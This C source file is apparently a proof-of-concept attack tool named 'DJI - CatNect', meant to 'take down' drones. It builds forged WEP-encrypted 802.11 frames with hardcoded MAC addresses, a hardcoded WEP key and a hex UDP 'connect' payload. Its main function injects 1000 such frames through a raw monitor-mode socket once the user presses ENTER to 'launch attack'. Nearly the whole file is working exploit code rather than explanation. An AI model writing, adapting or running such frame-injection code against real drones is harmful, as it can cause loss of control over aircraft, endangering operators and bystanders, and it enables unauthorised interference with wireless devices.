#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <time.h>

#define IFACE "mon0"
#define NUM_DISCONNECTS 1000
static uint16_t udp_seq = 0;

// (seq << 4) + frag
static inline uint16_t produce_sc(uint8_t frag, uint16_t seq) {
    return (seq << 4) | frag;
}

// Swap32 helper (big <-> little) if ever needed
static inline uint32_t swap32(uint32_t i) {
    return ((i & 0x000000FFU) << 24) |
           ((i & 0x0000FF00U) << 8)  |
           ((i & 0x00FF0000U) >> 8)  |
           ((i & 0xFF000000U) >> 24);
}

/* ---------- RC4 Encryption ---------- */

typedef struct {
    uint8_t S[256];
    uint8_t i, j;
} rc4_state;

void rc4_init(rc4_state *st, const uint8_t *key, size_t keylen) {
    uint8_t j = 0;
    for (int i = 0; i < 256; i++)
        st->S[i] = (uint8_t)i;
    for (int i = 0; i < 256; i++) {
        j = (uint8_t)(j + st->S[i] + key[i % keylen]);
        uint8_t tmp = st->S[i];
        st->S[i] = st->S[j];
        st->S[j] = tmp;
    }
    st->i = 0;
    st->j = 0;
}

void rc4_crypt(rc4_state *st, const uint8_t *in, uint8_t *out, size_t len) {
    for (size_t n = 0; n < len; n++) {
        st->i = (uint8_t)(st->i + 1);
        st->j = (uint8_t)(st->j + st->S[st->i]);
        uint8_t tmp = st->S[st->i];
        st->S[st->i] = st->S[st->j];
        st->S[st->j] = tmp;
        uint8_t K = st->S[(uint8_t)(st->S[st->i] + st->S[st->j])];
        out[n] = in[n] ^ K;
    }
}

/* ---------- CRC32 ---------- */

static uint32_t crc32_table[256];

static void crc32_init_table(void) {
    uint32_t poly = 0xEDB88320U;
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int j = 0; j < 8; j++) {
            if (c & 1)
                c = poly ^ (c >> 1);
            else
                c >>= 1;
        }
        crc32_table[i] = c;
    }
}

static uint32_t crc32_local(uint32_t crc, const uint8_t *buf, size_t len) {
    crc = crc ^ 0xFFFFFFFFU;
    for (size_t i = 0; i < len; i++) {
        uint8_t b = buf[i];
        crc = crc32_table[(crc ^ b) & 0xFF] ^ (crc >> 8);
    }
    return crc ^ 0xFFFFFFFFU;
}

/* ---------- Helpers ---------- */

// Convert hex string to bytes
static size_t hex_to_bytes(const char *hex, uint8_t *out, size_t max_out) {
    size_t len = 0;
    while (hex[0] && hex[1] && len < max_out) {
        unsigned int v;
        sscanf(hex, "%2x", &v);
        out[len++] = (uint8_t)v;
        hex += 2;
    }
    return len;
}

// IP header
#pragma pack(push, 1)
struct ip_hdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct udp_hdr {
    uint16_t sport;
    uint16_t dport;
    uint16_t len;
    uint16_t check;
};

struct llc_hdr {
    uint8_t dsap;
    uint8_t ssap;
    uint8_t ctrl;
};
#pragma pack(pop)

static uint16_t ip_checksum(void *vdata, size_t length) {
    uint32_t acc = 0;
    uint16_t *data = (uint16_t *)vdata;
    for (size_t i = 0; i + 1 < length; i += 2) {
        acc += ntohs(*data++);
        if (acc > 0xFFFF)
            acc = (acc & 0xFFFF) + (acc >> 16);
    }
    if (length & 1) {
        uint16_t last = 0;
        *(uint8_t *)&last = *((uint8_t *)data);
        acc += ntohs(last);
        if (acc > 0xFFFF)
            acc = (acc & 0xFFFF) + (acc >> 16);
    }
    return htons(~acc & 0xFFFF);
}

uint16_t udp_checksum(const struct ip_hdr *ip, const struct udp_hdr *udp,
                      const uint8_t *payload, size_t payload_len) {
    uint32_t acc = 0;

    acc += (ip->saddr >> 16) & 0xFFFF;
    acc += (ip->saddr) & 0xFFFF;
    acc += (ip->daddr >> 16) & 0xFFFF;
    acc += (ip->daddr) & 0xFFFF;
    acc += htons(ip->protocol);
    acc += udp->len;

    size_t len = sizeof(struct udp_hdr);
    const uint16_t *data16 = (const uint16_t *)udp;
    for (size_t i = 0; i < len / 2; i++)
        acc += ntohs(data16[i]);

    len = payload_len;
    data16 = (const uint16_t *)payload;
    while (len > 1) {
        acc += ntohs(*data16++);
        len -= 2;
    }
    if (len > 0) {
        uint16_t last = 0;
        *(uint8_t *)&last = *(const uint8_t *)data16;
        acc += ntohs(last);
    }

    while (acc >> 16)
        acc = (acc & 0xFFFF) + (acc >> 16);

    return htons((uint16_t)(~acc));
}

/* ---------- Main builder ---------- */

size_t send_udp_build(const char *payload_hex, uint32_t ivcounter,
                      uint8_t *final_packet, size_t max_final)
{
    /* Radiotap header */
    const uint8_t radiotap_hdr[16] = {
        0x00, 0x00,
        0x10, 0x00,
        0x2c, 0x00, 0x00, 0x00,
        0x0c,
        0x00,
        0x71, 0x09,
        0xc0, 0x20,
        (uint8_t)-18,
        0x00
    };

    /* MAC addresses and WEP key */
    uint8_t src_mac[6]   = {0x34,0xd2,0x62,0x29,0x11,0x22};
    uint8_t dst_mac[6]   = {0x34,0xd2,0x62,0x29,0x22,0x33};
    uint8_t bssid_mac[6] = {0x38,0xd2,0x62,0x29,0x22,0x33};
    uint8_t key[5]       = {'A','B','C','D','E'};               // WEP Key

    /* Build udp_pkt = LLC + org_code + type + IP + UDP + payload */
    uint8_t udp_pkt[2048];
    size_t upos = 0;

    struct llc_hdr llc = { .dsap = 0xaa, .ssap = 0xaa, .ctrl = 0x03 };
    memcpy(udp_pkt + upos, &llc, sizeof(llc));
    upos += sizeof(llc);

    uint8_t org_code[3] = {0x00,0x00,0x00};
    memcpy(udp_pkt + upos, org_code, 3);
    upos += 3;

    uint8_t llc_type[2] = {0x08,0x00};
    memcpy(udp_pkt + upos, llc_type, 2);
    upos += 2;

    struct ip_hdr ip;
    memset(&ip, 0, sizeof(ip));
    ip.ver_ihl  = 0x45;
    ip.tos      = 0;
    ip.id       = htons(0x0000);
    ip.frag_off = htons(0x4000);
    ip.ttl      = 64;
    ip.protocol = 17;
    ip.check    = 0;
    ip.saddr    = inet_addr("192.168.2.2");
    ip.daddr    = inet_addr("192.168.2.1");

    struct udp_hdr udp;
    udp.sport = htons(10002);
    udp.dport = htons(9003);
    udp.len   = 0;
    udp.check = 0;

    uint8_t payload[1024];
    size_t payload_len = hex_to_bytes(payload_hex, payload, sizeof(payload));

    udp.len = htons(sizeof(struct udp_hdr) + payload_len);
    size_t ip_total_len = sizeof(struct ip_hdr) + sizeof(struct udp_hdr) + payload_len;
    ip.tot_len = htons(ip_total_len);

    ip.check = 0;
    ip.check = ip_checksum(&ip, sizeof(ip));

    memcpy(udp_pkt + upos, &ip, sizeof(ip));
    upos += sizeof(ip);

    memcpy(udp_pkt + upos, &udp, sizeof(udp));
    upos += sizeof(udp);

    memcpy(udp_pkt + upos, payload, payload_len);
    upos += payload_len;

    size_t udp_pkt_len = upos;

    udp.check = udp_checksum(&ip, &udp, payload, payload_len);
    memcpy(udp_pkt + sizeof(llc) + 3 + 2 + sizeof(ip), &udp, sizeof(udp));

    /* udp_pkt2 = udp_pkt + CRC32(udp_pkt) */
    uint32_t crc = crc32_local(0, udp_pkt, udp_pkt_len);
    crc &= 0xffffffff;

    uint8_t crc_bytes[4];
    crc_bytes[0] = (uint8_t)(crc & 0xFF);
    crc_bytes[1] = (uint8_t)((crc >> 8) & 0xFF);
    crc_bytes[2] = (uint8_t)((crc >> 16) & 0xFF);
    crc_bytes[3] = (uint8_t)((crc >> 24) & 0xFF);

    uint8_t udp_pkt2[2048];
    memcpy(udp_pkt2, udp_pkt, udp_pkt_len);
    memcpy(udp_pkt2 + udp_pkt_len, crc_bytes, 4);
    size_t udp_pkt2_len = udp_pkt_len + 4;

    /* IV from ivcounter (3 bytes, big-endian) */
    uint8_t iv[3];
    iv[0] = (ivcounter >> 16) & 0xFF;
    iv[1] = (ivcounter >> 8)  & 0xFF;
    iv[2] = (ivcounter)       & 0xFF;

    /* RC4 seed = IV + key */
    uint8_t seed[8];
    memcpy(seed, iv, 3);
    memcpy(seed + 3, key, 5);

    rc4_state st1, st2;
    uint8_t wep[2048];
    uint8_t wep2[2048];

    rc4_init(&st1, seed, sizeof(seed));
    rc4_crypt(&st1, udp_pkt, wep, udp_pkt_len);

    rc4_init(&st2, seed, sizeof(seed));
    rc4_crypt(&st2, udp_pkt2, wep2, udp_pkt2_len);

    uint8_t icv[4];
    memcpy(icv, wep2 + udp_pkt2_len - 4, 4);

    /* final_packet = Radiotap + Dot11 + Duration + WEP(IV+KeyID+wepdata+ICV) */
    size_t fpos = 0;
    if (max_final < sizeof(radiotap_hdr))
        return 0;

    // Radiotap
    memcpy(final_packet + fpos, radiotap_hdr, sizeof(radiotap_hdr));
    fpos += sizeof(radiotap_hdr);

    // Frame Control
    uint16_t fc = htons(0x0840);
    memcpy(final_packet + fpos, &fc, 2);
    fpos += 2;

    // Duration/ID = 0x0000
    uint8_t duration[2] = {0x00, 0x00};
    memcpy(final_packet + fpos, duration, 2);
    fpos += 2;

    // addr1, addr2, addr3
    memcpy(final_packet + fpos, dst_mac,   6); fpos += 6;
    memcpy(final_packet + fpos, src_mac,   6); fpos += 6;
    memcpy(final_packet + fpos, bssid_mac, 6); fpos += 6;

    // Sequence Control
    uint16_t sc = produce_sc(0, 256 + udp_seq);
    udp_seq++;
    sc = htons(sc);
    memcpy(final_packet + fpos, &sc, 2);
    fpos += 2;

    // IV
    memcpy(final_packet + fpos, iv, 3);
    fpos += 3;

    // KeyID
    final_packet[fpos++] = 0x00;

    // wepdata
    memcpy(final_packet + fpos, wep, udp_pkt_len);
    fpos += udp_pkt_len;

    // ICV
    memcpy(final_packet + fpos, icv, 4);
    fpos += 4;

    return fpos;
}


int main() {

    printf("/*******************************************************\n");
    printf(" *                 DJI - CatNect\n");
    printf(" *\n");
    printf(" *                     /\\_/\\\n");
    printf(" *                    ( ･ω･ )\n");
    printf(" *                    /つ♡ ⊂\\\n");
    printf(" *                   (  / \\\\ )\n");
    printf(" *\n");
    printf(" *        Taking down drones with love <3\n");
    printf(" *******************************************************/\n");


    
    // Init CRC32 table
    crc32_init_table();

    const char *connect_pkt =
        "4080c30e0000000de87564006400bc051400003200fa00f401bc05140000fa0014006400bc0514000064000101040a0289dfb8f1b561754d1f363fd512585632";

    uint8_t final_packet[4096];
    size_t final_len = send_udp_build(connect_pkt, 1, final_packet, sizeof(final_packet));

    printf("final_packet (%zu bytes):\n", final_len);

    int sockfd;
    struct ifreq if_idx;
    struct sockaddr_ll socket_address;
    int i;

    // Open raw socket on monitor interface
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    memset(&if_idx, 0, sizeof(if_idx));
    strncpy(if_idx.ifr_name, IFACE, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
        perror("ioctl SIOCGIFINDEX");
        close(sockfd);
        return 1;
    }

    // Prepare sockaddr_ll
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ALL);
    socket_address.sll_halen = ETH_ALEN;

    // Wait for user command
    printf("Press ENTER to launch attack (send %d frames on %s)...\n",
           NUM_DISCONNECTS, IFACE);
    fflush(stdout);
    getchar();  // blocks until ENTER

    printf("[*] Sending %d disconnect frames on %s...\n", NUM_DISCONNECTS, IFACE);

    for (i = 0; i < NUM_DISCONNECTS; i++) {
        ssize_t sent = sendto(sockfd, final_packet, final_len, 0,
                              (struct sockaddr*)&socket_address, sizeof(socket_address));
        if (sent < 0) {
            perror("sendto");
            close(sockfd);
            return 1;
        }
        nanosleep((const struct timespec[]){{0, 10000000L}}, NULL); // 10ms delay
    }

    printf("[*] Done sending disconnect frames.\n");

    close(sockfd);
    return 0;
}
